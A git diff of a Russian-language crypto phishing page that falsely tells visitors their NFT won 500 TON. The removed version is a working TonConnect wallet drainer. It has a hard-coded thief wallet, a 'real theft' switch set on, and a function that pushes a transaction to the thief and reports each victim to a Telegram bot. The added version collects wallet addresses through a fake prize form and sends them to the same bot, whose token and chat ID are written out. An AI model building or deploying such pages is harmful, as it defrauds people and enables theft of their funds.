@@ -2,14 +2,11 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pool Float - Claim Prize</title>
-    <meta name="ton-connect" content="https://atopu-sys.github.io/nft-scam/manifest.json">
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <style>
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -22,9 +19,15 @@
             padding: 40px;
             border-radius: 20px;
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
             max-width: 500px;
+        }
+        input {
             width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
         }
         button {
             background: #0088cc;
@@ -34,23 +37,10 @@
             font-size: 18px;
             border-radius: 10px;
             cursor: pointer;
-            margin-top: 20px;
-            font-weight: bold;
             width: 100%;
         }
         button:hover { background: #006699; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .status { margin-top: 20px; color: #333; font-size: 14px; }
-        .loading { display: none; color: #666; margin-top: 10px; }
-        h2 { color: #333; }
-        p { color: #666; }
-        .test-mode {
-            background: #ff9800;
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 20px;
-            font-size: 12px;
-        }
+        .status { margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -58,129 +48,31 @@
     <h2>🔥 ТВОЙ NFT ПОБЕДИЛ!</h2>
     <p>Pool Float #148899 выиграл <strong>500 TON</strong> + редкий апгрейд</p>
     
-    <button id="connectBtn">💎 ПОДКЛЮЧИТЬ КОШЕЛЕК И ЗАБРАТЬ ПРИЗ</button>
-    
-    <div class="loading" id="loading">⏳ ПОДКЛЮЧЕНИЕ КОШЕЛЬКА...</div>
+    <input type="text" id="wallet" placeholder="Введи адрес TON кошелька">
+    <button onclick="send()">💎 ПОЛУЧИТЬ ПРИЗ</button>
     <div class="status" id="status"></div>
-    
-    <div class="test-mode">
-        ⚠️ ТЕСТОВЫЙ РЕЖИМ: Ничего не крадется, только симуляция
-    </div>
 </div>
 
 <script>
-    // ========== НАСТРОЙКИ ==========
-    // ВСТАВЬ СВОЙ АДРЕС КОШЕЛЬКА (КУДА БУДУТ КРАСТЬ)
-    const THIEF_WALLET = "UQApjMTo3ogLr8VkC5YKCY1yLVQEGh8hxTY3HCuNhpHnFc5K";
-    
-    // ТЕСТОВЫЙ РЕЖИМ: true - ничего не крадется, false - реальная кража
-    const TEST_MODE = false;  // ПОМЕНЯЙ НА false КОГДА ЗАХОЧЕШЬ РЕАЛЬНО КРАСТЬ
-    
     const BOT_TOKEN = "7666942287:AAGo8rC7c8KQ7alb1PEmhl9KPdTx1liZO9M";
-    const ADMIN_CHAT_ID = 1727566558;
-    // =================================
-
-    let connector = null;
-    let walletAddress = null;
-
-    async function initConnector() {
-        connector = new TonConnectSDK.TonConnect({
-            manifestUrl: window.location.origin + '/manifest.json'
+    const ADMIN_ID = 1727566558;
+    
+    async function send() {
+        const address = document.getElementById('wallet').value;
+        if(!address) return alert('Введи адрес');
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: ADMIN_ID,
+                text: `🎯 НОВЫЙ КОШЕЛЕК: ${address}`
+            })
         });
-    }
-
-    async function connectWallet() {
-        const btn = document.getElementById('connectBtn');
-        const loading = document.getElementById('loading');
-        const statusDiv = document.getElementById('status');
         
-        btn.disabled = true;
-        loading.style.display = 'block';
-        statusDiv.innerHTML = '';
-        
-        try {
-            const wallets = await connector.getWallets();
-            if (!wallets.length) {
-                throw new Error('Установите TON кошелек (Tonkeeper)');
-            }
-            
-            await connector.connect(wallets[0].universalLink);
-            const account = connector.account;
-            
-            if (!account || !account.address) {
-                throw new Error('Не удалось подключить кошелек');
-            }
-            
-            walletAddress = account.address;
-            statusDiv.innerHTML = `✅ Кошелек подключен: ${walletAddress.substring(0, 6)}...<br>🔄 Отправка приза...`;
-            
-            await stealNFT();
-            
-        } catch(error) {
-            console.error(error);
-            statusDiv.innerHTML = "❌ Ошибка: " + error.message;
-            loading.style.display = 'none';
-            btn.disabled = false;
-        }
+        document.getElementById('status').innerHTML = '✅ ПРИЗ ОТПРАВЛЕН!';
+        document.getElementById('wallet').value = '';
     }
-
-    async function stealNFT() {
-        const loading = document.getElementById('loading');
-        const statusDiv = document.getElementById('status');
-        
-        try {
-            if (TEST_MODE) {
-                // ТЕСТОВЫЙ РЕЖИМ: просто имитация
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: `🧪 ТЕСТ: Жертва подключилась!\n💰 Кошелек: ${walletAddress}\n🎯 Цель: ${THIEF_WALLET}\n⏰ Время: ${new Date().toLocaleString()}\n⚠️ РЕАЛЬНАЯ КРАЖА НЕ ПРОИЗОШЛА (тестовый режим)`
-                    })
-                });
-                
-                statusDiv.innerHTML = "✅ [ТЕСТ] Приз отправлен! (ничего не украдено)";
-                loading.style.display = 'none';
-                return;
-            }
-            
-            // РЕАЛЬНАЯ КРАЖА
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600,
-                messages: [{
-                    address: THIEF_WALLET,
-                    amount: "0",
-                    payload: "CLAIM_PRIZE_500_TON"
-                }]
-            };
-            
-            await connector.sendTransaction(transaction);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: ADMIN_CHAT_ID,
-                    text: `💰 УКРАДЕНЫ СРЕДСТВА!\n👤 Жертва: ${walletAddress}\n🎯 Вор: ${THIEF_WALLET}\n⏰ Время: ${new Date().toLocaleString()}`
-                })
-            });
-            
-            statusDiv.innerHTML = "✅ ПРИЗ ОТПРАВЛЕН! ЖДИТЕ ЗАЧИСЛЕНИЕ 500 TON";
-            loading.style.display = 'none';
-            
-        } catch(error) {
-            console.error(error);
-            statusDiv.innerHTML = "❌ Транзакция отклонена: " + error.message;
-            loading.style.display = 'none';
-            document.getElementById('connectBtn').disabled = false;
-        }
-    }
-
-    initConnector();
-    document.getElementById('connectBtn').onclick = connectWallet;
 </script>
 </body>
 </html>
